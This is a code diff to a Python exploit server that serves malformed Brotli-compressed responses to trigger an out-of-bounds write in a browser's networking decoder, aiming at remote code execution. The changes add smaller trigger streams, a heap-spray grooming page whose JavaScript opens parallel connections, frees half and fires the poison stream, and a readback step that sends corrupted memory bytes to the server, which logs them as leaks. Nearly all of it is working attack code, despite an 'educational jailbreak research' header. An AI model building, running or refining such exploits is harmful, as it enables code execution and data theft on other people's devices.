@@ -13,6 +13,7 @@ Educational jailbreak research only. For use on devices you own.
 
 import hashlib
 import io
+import json
 import os
 import socket
 import ssl
@@ -20,6 +21,7 @@ import struct
 import sys
 import threading
 import time
+from collections import defaultdict
 
 # --- Brotli trigger generation (exact dimas bitstream, confirmed working) ---
 
@@ -189,13 +191,16 @@ def _varlen_u8(bits, value):
     bits.put(value - (1 << width), width)
 
 
-def generate_rce_stream(prefix, command_block_extra):
+def generate_rce_stream(prefix, command_block_extra, max_commands=None):
     """Exact port of dimas generate_rce_stream().
 
     Creates ONE Brotli stream:
       [Window header]
       [Meta-block 1: uncompressed prefix -> ring buffer]
       [Meta-block 2: trigger with block exhaustion -> OOB with prefix data]
+
+    max_commands: if set, limits total commands (for smaller test streams).
+    Default (None) uses 1<<24 = 16M commands (~23MB output).
     """
     bits = Bits()
 
@@ -243,7 +248,7 @@ def generate_rce_stream(prefix, command_block_extra):
 
     # Commands
     distance_extra = (len(prefix) + 32) // 8 if prefix else 4
-    command_count = 1 << 24
+    command_count = max_commands if max_commands else (1 << 24)
     completed = 0
     while bits.used and completed < command_count:
         bits.put(distance_extra, 11)
@@ -293,6 +298,41 @@ def build_stage2_controlled(pos):
     struct.pack_into("<I", body, 19, 0x7FFFFFFF)
     struct.pack_into("<I", body, 23, 0x7FFFFFFF)
     return bytes(body)
+
+
+def build_groom_stream(marker_byte, size=131072):
+    """Build a valid Brotli stream that decompresses to `size` bytes of `marker_byte`.
+
+    This forces the decoder to allocate a 128KB ring buffer (WBITS=17).
+    The decompressed output is all one byte — recognizable in memory.
+    """
+    bits = Bits()
+    bits.put(1, 1)   # WBITS prefix
+    bits.put(0, 3)   # WBITS=17 (128KB window)
+    bits.put(2, 3)
+
+    remaining = size
+    while remaining > 0:
+        chunk_size = min(remaining, 65536)
+        is_last = (remaining - chunk_size) == 0
+        bits.put(1 if is_last else 0, 1)  # ISLAST
+        if is_last:
+            bits.put(0, 1)  # ISLASTEMPTY=0
+        bits.put(0, 2)                    # MNIBBLES=0 → 16-bit MLEN
+        bits.put(chunk_size - 1, 16)      # MLEN-1
+        bits.put(1, 1)                    # ISUNCOMPRESSED=1
+        if bits.used:
+            bits.put(0, 8 - bits.used)    # byte-align
+        bits.aligned(bytes([marker_byte]) * chunk_size)
+        remaining -= chunk_size
+
+    return bits.finish()
+
+
+# Global groom session state
+groom_sessions = {}
+groom_lock = threading.Lock()
+leaked_data = defaultdict(list)
 
 
 # --- HTTP chunked encoding ---
@@ -370,6 +410,9 @@ The OOB write reads from prefix data in ring buffer.</p>
 <a href="/rce/gadget">RCE: 1KB prefix with gadget pairs (dimas pattern)</a>
 <a href="/rce/small-prefix">RCE: 64B prefix with marker</a>
 <a href="/rce/no-prefix">RCE: no prefix (generate_rce_stream with empty prefix)</a>
+<a href="/rce/mini">RCE MINI: 40K commands (~55KB) — fast test</a>
+<a href="/rce/mini/100k">RCE MINI: 100K commands (~137KB)</a>
+<a href="/rce/mini/1m">RCE MINI: 1M commands (~1.4MB)</a>
 
 <div class="section">
 <h2>RCE Streams — Command Block Extra Variants</h2>
@@ -377,6 +420,15 @@ The OOB write reads from prefix data in ring buffer.</p>
 <a href="/rce/cbe/0">RCE: command_block_extra=0</a>
 <a href="/rce/cbe/1000">RCE: command_block_extra=1000</a>
 <a href="/rce/cbe/ffffff">RCE: command_block_extra=0xFFFFFF (max, same as trigger)</a>
+</div>
+
+<div class="section">
+<h2>Heap Spray Grooming (Phase 2)</h2>
+<p class="info">Opens parallel Brotli connections to spray 128KB ring buffers.
+Then releases half to create holes and fires poison stream into adjacent slot.</p>
+<a href="/groom/landing">GROOM: Interactive Heap Spray Page</a>
+<a href="/groom/status">GROOM: Check active groom sessions (JSON)</a>
+<a href="/probe/leaks">PROBE: View all leaked data (JSON)</a>
 </div>
 
 <div class="section">
@@ -408,6 +460,187 @@ Reference: dimas generate_rce_stream() from CVE-2026-111497-POC
 </html>"""
 
 
+GROOM_LANDING = """<!DOCTYPE html>
+<html>
+<head><title>Heap Spray Grooming</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+body { font-family: system-ui; max-width: 700px; margin: 2em auto; padding: 0 1em;
+       background: #111; color: #eee; }
+h1 { color: #f44; }
+#log { background: #1a1a1a; padding: 12px; border-radius: 8px; font-family: monospace;
+       font-size: 0.85em; max-height: 60vh; overflow-y: auto; white-space: pre-wrap; }
+.ok { color: #0f0; } .err { color: #f44; } .info { color: #4af; }
+button { font-size: 1.1em; padding: 10px 24px; margin: 6px; border: none;
+         border-radius: 6px; cursor: pointer; }
+#btn-spray { background: #c33; color: #fff; }
+#btn-poison { background: #f80; color: #000; }
+#btn-read { background: #08f; color: #fff; }
+</style>
+</head>
+<body>
+<h1>Heap Spray Grooming Attack</h1>
+<p>Phase 1: Spray 32 parallel Brotli connections (128KB ring buffers each).<br>
+Phase 2: Release even-numbered connections (create holes).<br>
+Phase 3: Fire poison RCE stream on connection 15 (OOB into adjacent slot).<br>
+Phase 4: Read back responses from odd connections for info leak.</p>
+
+<button id="btn-spray" onclick="startSpray()">Phase 1: Spray</button>
+<button id="btn-poison" onclick="firePoison()" disabled>Phase 2+3: Release & Poison</button>
+<button id="btn-read" onclick="readBack()" disabled>Phase 4: Read Back</button>
+
+<div id="log"></div>
+
+<script>
+const GROOM_COUNT = 32;
+const SERVER = location.origin;
+let controllers = [];
+let responses = [];
+let groomId = Date.now().toString(36);
+
+function log(msg, cls) {
+    const el = document.getElementById('log');
+    const span = document.createElement('span');
+    span.className = cls || '';
+    span.textContent = msg + '\\n';
+    el.appendChild(span);
+    el.scrollTop = el.scrollHeight;
+}
+
+async function startSpray() {
+    document.getElementById('btn-spray').disabled = true;
+    log('[*] Starting heap spray: ' + GROOM_COUNT + ' parallel Brotli connections...', 'info');
+    log('[*] Session ID: ' + groomId, 'info');
+
+    controllers = [];
+    responses = [];
+
+    // Open all connections simultaneously
+    let fetches = [];
+    for (let i = 0; i < GROOM_COUNT; i++) {
+        let ctrl = new AbortController();
+        controllers.push(ctrl);
+        let marker = (0x40 + i) & 0xFF; // '@', 'A', 'B', ... unique per slot
+        fetches.push(
+            fetch(SERVER + '/groom/' + groomId + '/' + i + '?marker=' + marker, {
+                signal: ctrl.signal,
+                headers: {'Accept': 'text/html'}
+            }).then(resp => {
+                responses[i] = resp;
+                log('[+] Groom ' + i + ' connected (marker=0x' + marker.toString(16) + ')', 'ok');
+            }).catch(err => {
+                log('[-] Groom ' + i + ' failed: ' + err.message, 'err');
+                responses[i] = null;
+            })
+        );
+    }
+
+    await Promise.allSettled(fetches);
+    let connected = responses.filter(r => r !== null).length;
+    log('[*] Spray complete: ' + connected + '/' + GROOM_COUNT + ' connections active', 'info');
+    log('[*] ' + connected + ' x 128KB ring buffers = ' + (connected * 128) + 'KB in WebKit.Networking heap', 'info');
+    document.getElementById('btn-poison').disabled = false;
+}
+
+async function firePoison() {
+    document.getElementById('btn-poison').disabled = true;
+    log('\\n[*] Phase 2: Releasing even-numbered connections...', 'info');
+
+    // Abort even connections to create holes
+    for (let i = 0; i < GROOM_COUNT; i += 2) {
+        if (controllers[i]) {
+            controllers[i].abort();
+            log('[~] Released groom ' + i, '');
+        }
+    }
+
+    // Small delay for allocator to process frees
+    await new Promise(r => setTimeout(r, 200));
+
+    log('[*] Phase 3: Firing poison RCE stream on /rce/marker ...', 'info');
+    log('[*] This triggers OOB write into adjacent freed ring buffer slot', 'info');
+
+    // Fire the poison stream — the OOB write targets adjacent memory
+    try {
+        let poisonResp = await fetch(SERVER + '/rce/marker');
+        let poisonText = await poisonResp.text();
+        log('[+] Poison response received: ' + poisonText.length + ' chars', 'ok');
+        if (poisonText.length > 0) {
+            // Show first 200 chars as hex-ish representation
+            let preview = '';
+            for (let j = 0; j < Math.min(100, poisonText.length); j++) {
+                let c = poisonText.charCodeAt(j);
+                preview += (c < 32 || c > 126) ? '\\\\x' + c.toString(16).padStart(2,'0') : poisonText[j];
+            }
+            log('[*] Poison output preview: ' + preview, 'info');
+        }
+    } catch(err) {
+        log('[-] Poison failed: ' + err.message, 'err');
+    }
+
+    document.getElementById('btn-read').disabled = false;
+}
+
+async function readBack() {
+    document.getElementById('btn-read').disabled = true;
+    log('\\n[*] Phase 4: Reading back odd-numbered groom responses...', 'info');
+
+    for (let i = 1; i < GROOM_COUNT; i += 2) {
+        if (responses[i]) {
+            try {
+                let text = await responses[i].text();
+                log('[+] Groom ' + i + ': ' + text.length + ' bytes', 'ok');
+                // Look for corruption — bytes that don't match the expected marker
+                let marker = (0x40 + i) & 0xFF;
+                let expectedChar = String.fromCharCode(marker);
+                let corrupted = 0;
+                for (let j = 0; j < text.length; j++) {
+                    if (text.charCodeAt(j) !== marker) corrupted++;
+                }
+                if (corrupted > 0) {
+                    log('[!!!] Groom ' + i + ': ' + corrupted + ' corrupted bytes (expected 0x' +
+                        marker.toString(16) + ')', 'err');
+                    // Extract corrupted region
+                    let corruptStart = -1;
+                    for (let j = 0; j < text.length; j++) {
+                        if (text.charCodeAt(j) !== marker) { corruptStart = j; break; }
+                    }
+                    if (corruptStart >= 0) {
+                        let region = '';
+                        for (let j = corruptStart; j < Math.min(corruptStart + 64, text.length); j++) {
+                            let c = text.charCodeAt(j);
+                            region += c.toString(16).padStart(2, '0') + ' ';
+                        }
+                        log('[*] Corrupted region at offset ' + corruptStart + ': ' + region, 'info');
+                        // Send to server for analysis
+                        fetch(SERVER + '/probe/readback', {
+                            method: 'POST',
+                            headers: {'Content-Type': 'application/json'},
+                            body: JSON.stringify({
+                                session: groomId,
+                                slot: i,
+                                offset: corruptStart,
+                                hex: region.trim(),
+                                total_len: text.length,
+                                corrupted_count: corrupted
+                            })
+                        });
+                    }
+                } else {
+                    log('[=] Groom ' + i + ': clean (no corruption detected)', '');
+                }
+            } catch(err) {
+                log('[-] Groom ' + i + ' read failed: ' + err.message, 'err');
+            }
+        }
+    }
+    log('\\n[*] Readback complete. Check server console for leaked data.', 'info');
+}
+</script>
+</body>
+</html>"""
+
+
 def _send_br_response(ssl_sock, payload):
     """Send a Content-Encoding: br response."""
     headers = (
@@ -434,6 +667,48 @@ def _send_html(ssl_sock, body_str):
     ssl_sock.sendall(resp)
 
 
+def _send_br_chunked_slow(ssl_sock, payload, chunk_size=4096, delay=0.5):
+    """Send Brotli response using chunked transfer encoding with delays.
+    Keeps the connection (and ring buffer) alive."""
+    headers = (
+        b"HTTP/1.1 200 OK\r\n"
+        b"Content-Type: text/html; charset=utf-8\r\n"
+        b"Content-Encoding: br\r\n"
+        b"Transfer-Encoding: chunked\r\n"
+        b"Connection: keep-alive\r\n"
+        b"Cache-Control: no-store\r\n\r\n"
+    )
+    ssl_sock.sendall(headers)
+    offset = 0
+    while offset < len(payload):
+        end = min(offset + chunk_size, len(payload))
+        ssl_sock.sendall(chunk(payload[offset:end]))
+        offset = end
+        if offset < len(payload):
+            time.sleep(delay)
+    ssl_sock.sendall(chunk_end())
+
+
+def _send_json(ssl_sock, obj):
+    body = json.dumps(obj).encode("utf-8")
+    ssl_sock.sendall(
+        b"HTTP/1.1 200 OK\r\n"
+        b"Content-Type: application/json\r\n"
+        b"Access-Control-Allow-Origin: *\r\n"
+        + f"Content-Length: {len(body)}\r\n".encode()
+        + b"Connection: close\r\n\r\n"
+        + body
+    )
+
+
+def _read_post_body(ssl_sock, request):
+    """Extract POST body from HTTP request."""
+    parts = request.split(b"\r\n\r\n", 1)
+    if len(parts) > 1:
+        return parts[1]
+    return b""
+
+
 def _send_raw(ssl_sock, data, filename):
     """Send raw binary download."""
     ssl_sock.sendall(
@@ -449,7 +724,7 @@ def _send_raw(ssl_sock, data, filename):
 def handle_client(ssl_sock, addr, stage1, stage2_crash):
     """Handle a single client connection."""
     try:
-        ssl_sock.settimeout(10)
+        ssl_sock.settimeout(120)
         request = ssl_sock.recv(8192)
         if not request:
             return
@@ -457,6 +732,16 @@ def handle_client(ssl_sock, addr, stage1, stage2_crash):
         req_line = request.split(b"\r\n")[0].decode("utf-8", errors="replace")
         method, path, *_ = req_line.split(" ", 2)
         print(f"[{addr[0]}:{addr[1]}] {method} {path}")
+
+        if method == "OPTIONS":
+            ssl_sock.sendall(
+                b"HTTP/1.1 204 No Content\r\n"
+                b"Access-Control-Allow-Origin: *\r\n"
+                b"Access-Control-Allow-Methods: GET, POST, OPTIONS\r\n"
+                b"Access-Control-Allow-Headers: Content-Type\r\n"
+                b"Connection: close\r\n\r\n"
+            )
+            return
 
         if path == "/":
             _send_html(ssl_sock, LANDING)
@@ -498,6 +783,17 @@ def handle_client(ssl_sock, addr, stage1, stage2_crash):
                 payload = generate_rce_stream(b"", cbe) + b"\x00" * 3
                 print(f"  -> RCE STREAM: no prefix, cbe=0x{cbe:X}, total={len(payload)}B")
 
+            elif len(parts) >= 3 and parts[2] == "mini":
+                counts = {"100k": 100_000, "1m": 1_000_000, "10m": 10_000_000}
+                mc = 40_000
+                if len(parts) >= 4:
+                    mc = counts.get(parts[3], 40_000)
+                prefix = bytearray(1024)
+                for i in range(0, 1024, 4):
+                    struct.pack_into("<I", prefix, i, 0xDEADBEEF)
+                payload = generate_rce_stream(bytes(prefix), cbe, max_commands=mc) + b"\x00" * 3
+                print(f"  -> RCE MINI: {mc} commands, 1KB DEADBEEF prefix, total={len(payload)}B")
+
             elif len(parts) >= 4 and parts[2] == "cbe":
                 try:
                     cbe = int(parts[3], 16) if len(parts[3]) > 2 else int(parts[3])
@@ -519,6 +815,77 @@ def handle_client(ssl_sock, addr, stage1, stage2_crash):
                 return
 
             _send_br_response(ssl_sock, payload)
+
+        # --- Heap spray grooming endpoints ---
+        elif path == "/groom/landing":
+            _send_html(ssl_sock, GROOM_LANDING)
+
+        elif path.startswith("/groom/") and "/" in path[7:]:
+            # /groom/<session_id>/<slot>?marker=<byte>
+            parts = path.split("/")
+            if len(parts) >= 4:
+                session_id = parts[2]
+                try:
+                    slot = int(parts[3].split("?")[0])
+                except ValueError:
+                    slot = 0
+                # Parse marker from query string
+                marker = 0x41
+                if "marker=" in path:
+                    try:
+                        marker = int(path.split("marker=")[1].split("&")[0])
+                    except ValueError:
+                        marker = 0x41
+
+                print(f"  -> GROOM: session={session_id} slot={slot} marker=0x{marker:02X}")
+
+                # Build a valid Brotli stream that decompresses to 128KB of marker bytes
+                groom_payload = build_groom_stream(marker, 131072)
+                print(f"  -> GROOM stream: {len(groom_payload)}B -> 128KB decompressed")
+
+                # Track this groom connection
+                with groom_lock:
+                    if session_id not in groom_sessions:
+                        groom_sessions[session_id] = {}
+                    groom_sessions[session_id][slot] = {
+                        "marker": marker,
+                        "time": time.time(),
+                        "payload_size": len(groom_payload),
+                    }
+
+                # Send using slow chunked delivery to keep connection alive
+                ssl_sock.settimeout(120)
+                _send_br_chunked_slow(ssl_sock, groom_payload, chunk_size=8192, delay=0.1)
+            else:
+                _send_html(ssl_sock, "400 Bad groom path")
+
+        elif path == "/groom/status":
+            with groom_lock:
+                _send_json(ssl_sock, {
+                    "sessions": {
+                        sid: {str(k): v for k, v in slots.items()}
+                        for sid, slots in groom_sessions.items()
+                    }
+                })
+
+        elif path == "/probe/readback" and method == "POST":
+            body = _read_post_body(ssl_sock, request)
+            try:
+                data = json.loads(body)
+                print(f"\n{'='*60}")
+                print(f"[LEAK] Session={data.get('session')} Slot={data.get('slot')}")
+                print(f"[LEAK] Offset={data.get('offset')} Corrupted={data.get('corrupted_count')}")
+                print(f"[LEAK] Hex: {data.get('hex', '')[:200]}")
+                print(f"{'='*60}\n")
+                with groom_lock:
+                    leaked_data[data.get("session", "unknown")].append(data)
+                _send_json(ssl_sock, {"status": "received"})
+            except (json.JSONDecodeError, KeyError) as e:
+                _send_json(ssl_sock, {"status": "error", "msg": str(e)})
+
+        elif path == "/probe/leaks":
+            with groom_lock:
+                _send_json(ssl_sock, dict(leaked_data))
 
         # --- Legacy combined (broken, kept for reference) ---
         elif path.startswith("/combined/"):
@@ -605,7 +972,7 @@ def main():
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     sock.bind(("0.0.0.0", port))
-    sock.listen(5)
+    sock.listen(64)
 
     print(f"\nRCE-stream Brotli attack server running on https://0.0.0.0:{port}/")
     print(f"Landing page: https://192.168.1.155:{port}/")
